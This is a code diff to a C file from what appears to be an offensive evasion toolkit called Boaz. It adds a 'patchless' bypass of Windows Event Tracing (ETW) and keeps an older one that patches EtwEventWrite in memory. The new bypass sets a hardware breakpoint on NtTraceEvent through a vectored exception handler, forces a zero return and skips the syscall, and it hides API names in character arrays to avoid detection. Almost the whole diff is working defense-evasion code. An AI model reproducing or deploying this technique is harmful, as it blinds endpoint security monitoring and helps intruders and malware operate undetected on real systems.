@@ -1,3 +1,25 @@
+/*
+
+Patchless etw pass: 
+
+The patchless method can avoid detection on tampering of API functions. 
+
+EtwEventWrite and EtwEventWriteFull call NtTraceEvent, which is a syscall.
+
+We can set up a VEH and set-up HWBP using RtlCaptureContext to capture the context of the thread, 
+then NtContinue to update the thread context. 
+
+Inside the VEH handler when NtTraceEvent is called, we can redirect the RIP to Ret instruction 6 instructions after start address,
+, after the syscall, and set Rax=0, thus bypassing the ETW event completely. 
+
+* Author: Thomas X Meng
+# Date Nov 2024
+#
+# This file is part of the Boaz tool
+# Copyright (c) 2019-2025 Thomas M
+# Licensed under the GPLv3 or later.
+
+*/
 #include "etw_pass.h"
 #include <winternl.h>
 #pragma comment (lib, "advapi32")
@@ -82,11 +104,11 @@ BOOL NeutralizeETW() {
     // printf("[*] ETW EventWrite Base Address : 0x%p \n", pEventWrite);
     // getchar();
 
-#ifdef _WIN64
-    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret for x64
-#else
-    memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14 for x86
-#endif
+    #ifdef _WIN64
+        memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret for x64
+    #else
+        memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14 for x86
+    #endif
 
     // printf ("[+] ETW EventWrite Patched, check mem\n");
     // getchar();
@@ -102,6 +124,119 @@ BOOL NeutralizeETW() {
 
     return TRUE;
 }
+
+// New ETW pass:
+
+typedef NTSTATUS(WINAPI *NtContinue_t)(PCONTEXT, BOOLEAN);
+
+typedef NTSTATUS(WINAPI *NtTraceEvent_t)(void*, void*, ULONG, ULONG);
+
+NtContinue_t NtContinue = NULL;
+NtTraceEvent_t NtTraceEvent = NULL;
+
+uintptr_t find_gadget(uintptr_t function, BYTE *stub, size_t size, size_t dist) {
+    for (size_t i = 0; i < dist; i++) {
+        if (memcmp((LPVOID)(function + i), stub, size) == 0) {
+            printf("[+] Found gadget at: %p\n", (PVOID)(function + i));
+            return (function + i);
+        }
+    }
+    return 0ull;
+}
+
+LONG WINAPI exception_handler(PEXCEPTION_POINTERS ExceptionInfo) {
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
+        PVOID rip = (PVOID)ExceptionInfo->ContextRecord->Rip;
+        static uintptr_t NtTraceEventAddr = 0;
+        
+        if (!NtTraceEvent) {
+
+            NtTraceEventAddr = (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sGetThis);
+            // EtwEventWriteAddr = (uintptr_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sEtwEventWrite);
+        }
+        NtTraceEventAddr = (uintptr_t)NtTraceEvent;
+        
+        if ((uintptr_t)rip == NtTraceEventAddr) {
+            printf("[+] Intercepted function at %p\n", rip);
+            ExceptionInfo->ContextRecord->Rax = 0;
+            PVOID ret_addr = (PVOID)find_gadget((uintptr_t)rip, (BYTE*)"\xc3", 1, 100);
+            if (ret_addr) {
+                printf("[+] Redirecting RIP to: %p\n", ret_addr);
+                ExceptionInfo->ContextRecord->Rip = (DWORD64)ret_addr;
+            }
+
+
+            printf("[+] Continuing execution\n");
+            getchar();
+
+            ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+
+BOOL BypassETW() {
+
+
+    unsigned char sNtTraceEvent[] = {'N','t','T','r','a','c','e','E','v','e','n','t', 0};
+    // unsigned char sEtwEventWrite[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e', 0};
+    unsigned char sNtContinue[] = {'N','t','C','o','n','t','i','n','u','e', 0};
+
+    NtContinue = (NtContinue_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sNtContinue);
+    NtTraceEvent = (NtTraceEvent_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sNtTraceEvent);
+    
+    if (!NtContinue) {
+        printf("[-] Failed to resolve NtContinue, exiting...\n");
+        return 1;
+    }
+    if (!NtTraceEvent) {
+        printf("[-] Failed to resolve NtTraceEvent, exiting...\n");
+        return 1;
+    }
+    
+    // printf("[DEBUG] Registering exception handler...\n");
+    AddVectoredExceptionHandler(1, exception_handler);
+    printf("[+] Exception handler registered\n");
+    
+    static int initialised = 0;
+    CONTEXT context_thread = {0};
+    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    RtlCaptureContext(&context_thread);
+    /// NtContinue will have rip pointed back to here since we captured the thread context at this point.
+    /// Alternatively, we can do context_thread.Rip++ a few times to reach the point where NtTraceEvent is called.
+
+    if (!initialised) {
+        // printf("[DEBUG] Captured thread context\n");
+        printf("\tDr0: %p\tDr7: %p\n", (PVOID)context_thread.Dr0, (PVOID)context_thread.Dr7);
+        
+        context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        context_thread.Dr0 = (uintptr_t)NtTraceEvent;
+        
+        if (!context_thread.Dr0) {
+            printf("[-] Failed to resolve function address, exiting...\n");
+            return 1;
+        }
+        
+        // printf("[DEBUG] Breakpoints resolved. NtTraceEvent: %p\n", (PVOID)context_thread.Dr0);
+        
+        printf("[+] Setting breakpoint on NtTraceEvent (%p)\n", (PVOID)context_thread.Dr0);
+        
+        context_thread.Dr7 |= (1ull << (2 * 0));
+        context_thread.Dr7 &= ~(3ull << (16 + 4 * 0));
+        context_thread.Dr7 &= ~(3ull << (18 + 4 * 0));
+        
+        initialised = 1;
+        // printf("[DEBUG] Calling NtContinue to resume execution\n");
+        NtContinue(&context_thread, FALSE);
+    }
+
+    return TRUE;
+
+}
+
+// New ETW pass end.
 
 bool everyThing() {
     int ret = 0;
@@ -147,7 +282,8 @@ bool everyThing() {
 
     printf("[+] Press any key to continue \n"); getchar();
 
-    if (!NeutralizeETW()) {
+    // if (!NeutralizeETW()) {
+    if (!BypassETW()) {
         return EXIT_FAILURE;
     } else {
         printf("\n[+] Post-Execution Patch Completed...\n");
